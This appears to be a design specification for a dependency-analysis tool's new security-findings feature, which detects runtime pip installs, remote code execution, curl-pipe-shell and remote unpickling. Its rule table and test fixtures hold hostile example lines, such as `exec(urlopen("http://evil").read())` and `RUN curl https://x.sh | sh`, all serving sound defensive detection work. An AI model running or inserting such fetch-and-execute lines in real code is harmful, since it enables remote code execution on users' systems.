# Suspicious Installation & Code-Execution Findings

## Overview
Surface code patterns in the analysed project that install dependencies or execute code at runtime — patterns that bypass Scarno's dependency model and may represent legitimate dynamic behaviour, confused packaging, or active supply-chain attacks. Emit structured `Finding` objects alongside the existing `Dependency` list.

## Problem Statement
A project can be entirely clean at the `requirements.txt` level while its source code does `subprocess.run(["pip", "install", "evil-pkg-typo"])` on import — an attacker's favourite vector. Scarno today has no way to surface this. Worse, such patterns cause both **false-negative** (package installed at runtime, never declared) and **false-positive** (declared package appears unused because real usage is gated on a dynamic install) classifications.

This requirement is also the natural place to flag the broader family of "Scarno-invisible" behaviours: inline pip installs, remote-code execution via downloaded payloads, `exec`/`eval` of network responses, and pickle-based loaders pointing at remote URLs.

## Scope Boundaries

| In scope | Out of scope |
|----------|--------------|
| Flag the pattern; cite file:line | Determine whether the pattern is actually malicious (no taint analysis, no sandboxing) |
| Classify confidence as `LOW` / `MEDIUM` / `HIGH` / `CRITICAL` per a static rule table | Integrate with PyPI / OSV / typosquat databases (Phase 4) |
| Produce JSON-schema-stable output | Generate SARIF, CSV, or SBOM exports |
| Allow user suppression via `# scarno: allow <rule-id>` inline comment | Auto-fix / auto-redact |

## Data Model Extension

Add to `src/scarno/models.py`:

```python
class FindingSeverity(str, Enum):
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CRITICAL = "CRITICAL"


class FindingKind(str, Enum):
    RUNTIME_PIP_INSTALL = "RUNTIME_PIP_INSTALL"
    NOTEBOOK_PIP_MAGIC = "NOTEBOOK_PIP_MAGIC"
    REMOTE_CODE_EXEC = "REMOTE_CODE_EXEC"           # eval/exec of network response
    DOWNLOAD_AND_EXEC = "DOWNLOAD_AND_EXEC"         # download then exec / system
    OS_SYSTEM_PIP = "OS_SYSTEM_PIP"                 # os.system("pip install …")
    DYNAMIC_IMPORT_UNVALIDATED = "DYNAMIC_IMPORT_UNVALIDATED"
    INSECURE_UNPICKLE_REMOTE = "INSECURE_UNPICKLE_REMOTE"
    SETUP_PY_DYNAMIC_DEPS = "SETUP_PY_DYNAMIC_DEPS"  # `install_requires=<non-literal>`
    VENDORED_OVERLAP = "VENDORED_OVERLAP"           # from REQ-3b
    VENDORED_ONLY = "VENDORED_ONLY"                 # from REQ-3b
    CURL_PIPE_SHELL = "CURL_PIPE_SHELL"             # `curl … | sh` in Dockerfile/CI
    SHELL_INJECTION_IN_INSTALL = "SHELL_INJECTION_IN_INSTALL"


@dataclass
class Finding:
    rule_id: str                     # e.g. "TS-RULE-SI-001"
    kind: FindingKind
    severity: FindingSeverity
    file_path: str                   # project-relative
    line: int
    snippet: str                     # single-line, sanitised, max 200 chars
    message: str                     # human-readable, stable across versions
    remediation: str                 # suggested action
    package_hint: str | None = None  # package name if one is implicated
```

Add to `AnalysisResult`:

```python
@dataclass
class AnalysisResult:
    ...
    findings: list[Finding] = field(default_factory=list)
```

## Rule Table

Each rule has a stable ID. Severities are conservative defaults — a suppression mechanism lets teams downgrade per-repo.

| Rule ID | Kind | AST / pattern | Severity |
|---------|------|---------------|----------|
| `TS-SI-001` | `RUNTIME_PIP_INSTALL` | `subprocess.run`/`check_call`/`Popen` with first arg containing literal `"pip"` or `"pip3"` and `"install"` | HIGH |
| `TS-SI-002` | `RUNTIME_PIP_INSTALL` | `subprocess.run` with `["python", "-m", "pip", "install", …]` | HIGH |
| `TS-SI-003` | `OS_SYSTEM_PIP` | `os.system(<str>)` or `os.popen(<str>)` where `<str>` contains `pip install` substring | HIGH |
| `TS-SI-004` | `RUNTIME_PIP_INSTALL` | `pip.main([...])` or `pip._internal.main([...])` call | HIGH |
| `TS-SI-005` | `NOTEBOOK_PIP_MAGIC` | `.ipynb` cell source line matching `^\s*[!%]\s*pip\s+install` | MEDIUM |
| `TS-SI-006` | `NOTEBOOK_PIP_MAGIC` | `.ipynb` cell source line matching `^\s*%\s*conda\s+install` | MEDIUM |
| `TS-CE-001` | `REMOTE_CODE_EXEC` | `exec()` or `eval()` where arg is a `.read()` / `.text` / `.content` attribute on a `Call` to `urlopen` / `requests.get` / `httpx.get` / `urllib3` | CRITICAL |
| `TS-CE-002` | `DOWNLOAD_AND_EXEC` | Any variable assigned from a network fetch, then passed to `exec`/`eval`/`os.system`/`subprocess` | CRITICAL |
| `TS-CE-003` | `INSECURE_UNPICKLE_REMOTE` | `pickle.load`/`pickle.loads` where source traces to a network fetch (same taint as TS-CE-002) | CRITICAL |
| `TS-CE-004` | `DYNAMIC_IMPORT_UNVALIDATED` | `importlib.import_module(x)` / `__import__(x)` where `x` traces to any `input()`, env var, CLI arg, or network fetch | HIGH |
| `TS-CE-005` | `CURL_PIPE_SHELL` | Dockerfile or workflow `run:` line matching `curl.*\|\s*(sh|bash|python)` | HIGH |
| `TS-CE-006` | `SHELL_INJECTION_IN_INSTALL` | `subprocess.run(..., shell=True)` with interpolated package name from external input | CRITICAL |
| `TS-DS-001` | `SETUP_PY_DYNAMIC_DEPS` | `setup(install_requires=<non-literal>)` — re-use REQ-2's detection, produce a Finding in addition to the warning | MEDIUM |

Rule descriptions and remediation strings live in `src/scarno/findings/rules.py` so they can be version-controlled and unit-tested.

## Taint Analysis (Lightweight)

"Traces to a network fetch" / "external input" uses a **conservative intra-procedural taint pass**:

1. Build a per-function symbol table from `ast.walk`.
2. Seed taint on any variable bound from: `urllib.request.urlopen`, `urllib3.*`, `requests.get`/`post`/`put`/`patch`, `httpx.get`/`.*`, `aiohttp.ClientSession.get`, `os.environ`, `os.getenv`, `sys.argv`, `input()`, `open(<path>, "r")` where `<path>` is itself tainted.
3. Propagate taint through: assignment, attribute access, method calls on tainted objects (`.read()`, `.text`, `.json()`), f-string interpolation, `+` concatenation.
4. Mark a Finding when a tainted value reaches any sink (`exec`, `eval`, `os.system`, `subprocess.*`, `pickle.load*`, `importlib.import_module`).

**Explicit non-goals:** inter-procedural analysis, class-level field taint, async boundary tracking. These produce false negatives, not false positives — Scarno's tolerance is heavily biased towards not crying wolf.

## Suppression

Two mechanisms:

1. **Inline comment** on the triggering line or the line immediately above:
   ```python
   subprocess.run(["pip", "install", offline_pkg_path])  # scarno: allow TS-SI-001
   ```
2. **Config file** `pyproject.toml`:
   ```toml
   [tool.scarno.findings]
   suppress = ["TS-SI-001", "TS-CE-004"]          # globally
   paths = { "scripts/bootstrap.py" = ["TS-SI-001"] }  # per-file
   ```

Suppressed findings are excluded from the default report but available with `scarno --show-suppressed`.

## Output

### Text
A new section `SECURITY FINDINGS (N)` appears after `UNDECLARED` (introduced in REQ-3b):

```
SECURITY FINDINGS (2)
  ! [HIGH] TS-SI-001  scripts/bootstrap.py:14
      Runtime pip install via subprocess — deps declared at runtime bypass
      Scarno's dependency file analysis.
      Remediation: add the package to pyproject.toml or suppress with
      # scarno: allow TS-SI-001
  !! [CRITICAL] TS-CE-001  hooks/oauth_redirect.py:42
      exec() applied to network response — possible remote code execution.
      Remediation: do not execute untrusted remote content.
```

### JSON
`findings` is a top-level array in the JSON output:

```json
"findings": [
  {
    "rule_id": "TS-SI-001",
    "kind": "RUNTIME_PIP_INSTALL",
    "severity": "HIGH",
    "file_path": "scripts/bootstrap.py",
    "line": 14,
    "snippet": "subprocess.run([\"pip\", \"install\", dep_name])",
    "message": "Runtime pip install via subprocess — deps declared at runtime …",
    "remediation": "add the package to pyproject.toml …",
    "package_hint": null
  }
]
```

Snippet sanitisation: strip ANSI, strip control chars, truncate to 200 chars with `"…"` suffix. No surrounding source context (privacy: PRV-003 extends to findings).

## Exit Code Update

Extend REQ-1's exit codes:

| Code | Meaning |
|------|---------|
| 0 | No SAFE deps, no HIGH/CRITICAL findings |
| 1 | SAFE deps OR MEDIUM findings present |
| 2 | Analysis failed |
| 3 | HIGH or CRITICAL findings present *(new)* |

New flag: `--fail-on-severity {LOW,MEDIUM,HIGH,CRITICAL}` to override the default exit-code mapping for CI.

## Security & Threat Model

Scarno itself is reading source code that may contain adversarial payloads. Controls:

- AST-only walking; no execution of analysed source under any circumstance.
- Rule engine is data-driven (`rules.py` + pattern matcher). No `eval` on rule expressions.
- Finding `snippet` strings pass through `sanitise()` before output.
- Rule IDs are a fixed set in `rules.py`; user-supplied suppression accepts only the known set — unknown IDs in `pyproject.toml` produce a warning.

New SRTM rows:

| ID | Description |
|----|-------------|
| `SF-001` | Runtime pip-install pattern detection (TS-SI-001..004) |
| `SF-002` | Notebook pip-install magic detection (TS-SI-005..006) |
| `SF-003` | Remote-code-exec taint (TS-CE-001..003) |
| `SF-004` | Unvalidated dynamic import (TS-CE-004) |
| `SF-005` | Curl-pipe-shell in container/CI (TS-CE-005) |
| `SF-006` | Shell injection in install (TS-CE-006) |
| `SF-007` | setup.py dynamic deps as Finding (TS-DS-001) |
| `SF-008` | Inline `# scarno: allow <rule-id>` suppression honoured |
| `SF-009` | `pyproject.toml [tool.scarno.findings].suppress` honoured |
| `SF-010` | Unknown suppression rule-id in config produces warning |
| `SF-011` | Finding snippets are sanitised (ANSI / control chars stripped) |
| `SF-012` | Rule engine never invokes `eval`/`exec`/`subprocess` on analysed content |

## Test Fixtures

| Fixture | Content | Expected |
|---------|---------|----------|
| `findings_runtime_pip/` | `subprocess.run(["pip", "install", "foo"])` | 1 Finding `TS-SI-001 HIGH` |
| `findings_curl_exec/` | `exec(urlopen("http://evil").read())` | 1 Finding `TS-CE-001 CRITICAL` |
| `findings_notebook_magic/` | `.ipynb` with `!pip install pandas` | 1 Finding `TS-SI-005 MEDIUM` |
| `findings_dynamic_import/` | `importlib.import_module(os.getenv("PKG"))` | 1 Finding `TS-CE-004 HIGH` |
| `findings_dockerfile_curl_pipe/` | `RUN curl https://x.sh \| sh` | 1 Finding `TS-CE-005 HIGH` |
| `findings_suppressed_inline/` | `subprocess.run(["pip","install","x"])  # scarno: allow TS-SI-001` | 0 Findings (in default report) |
| `findings_suppressed_config/` | Same, with `pyproject.toml` suppressing `TS-SI-001` | 0 Findings |
| `findings_unknown_suppression/` | `suppress = ["TS-FAKE-999"]` | 1 warning in `errors` |
| `findings_snippet_ansi/` | Line containing ANSI escapes | Finding snippet has no `\x1b` |
| `findings_benign/` | Vanilla Flask app | 0 Findings |

## Acceptance Criteria
- [] Given `findings_runtime_pip/`, When analysed, Then 1 Finding with `rule_id="TS-SI-001"`, `severity=HIGH`, and `kind=RUNTIME_PIP_INSTALL` is emitted
- [] Given `findings_curl_exec/`, When analysed, Then 1 Finding with `rule_id="TS-CE-001"`, `severity=CRITICAL`
- [] Given `findings_notebook_magic/`, When analysed, Then 1 Finding with `rule_id="TS-SI-005"` referencing the cell
- [] Given `findings_dynamic_import/`, When analysed, Then 1 Finding with `rule_id="TS-CE-004"` is emitted
- [] Given `findings_dockerfile_curl_pipe/`, When analysed, Then 1 Finding with `rule_id="TS-CE-005"`
- [] Given `findings_suppressed_inline/`, When analysed, Then 0 findings appear in the default report
- [] Given `findings_suppressed_inline/`, When analysed with `--show-suppressed`, Then the Finding appears with a `suppressed=true` flag
- [] Given `findings_suppressed_config/` with `TS-SI-001` in `[tool.scarno.findings].suppress`, When analysed, Then 0 findings appear
- [] Given `findings_unknown_suppression/` with `TS-FAKE-999` in config, When analysed, Then a warning is appended mentioning the unknown rule ID
- [] Given `findings_snippet_ansi/`, When analysed, Then the Finding's `snippet` contains no `\x1b` byte
- [] Given any Finding emitted, When inspected, Then `snippet` length ≤ 200 chars
- [] Given the JSON reporter runs on a result with findings, When output is parsed, Then each finding object contains the required keys (`rule_id`, `kind`, `severity`, `file_path`, `line`, `snippet`, `message`, `remediation`)
- [] Given the text reporter runs on a result with findings, When output is rendered, Then a `SECURITY FINDINGS (N)` section appears between UNDECLARED and IN USE
- [] Given a project with 1 HIGH finding and no SAFE deps, When the CLI runs with default flags, Then exit code is `3`
- [] Given `--fail-on-severity MEDIUM` and a single MEDIUM finding, When the CLI runs, Then exit code is `3`
- [] Given `findings_benign/`, When analysed, Then 0 findings are emitted
- [] Given the rule engine runs on any fixture, When it executes, Then no `subprocess`, `eval`, or `exec` call occurs with source content
- [] Given a Finding's `file_path`, When inspected, Then the path is project-relative (not absolute)
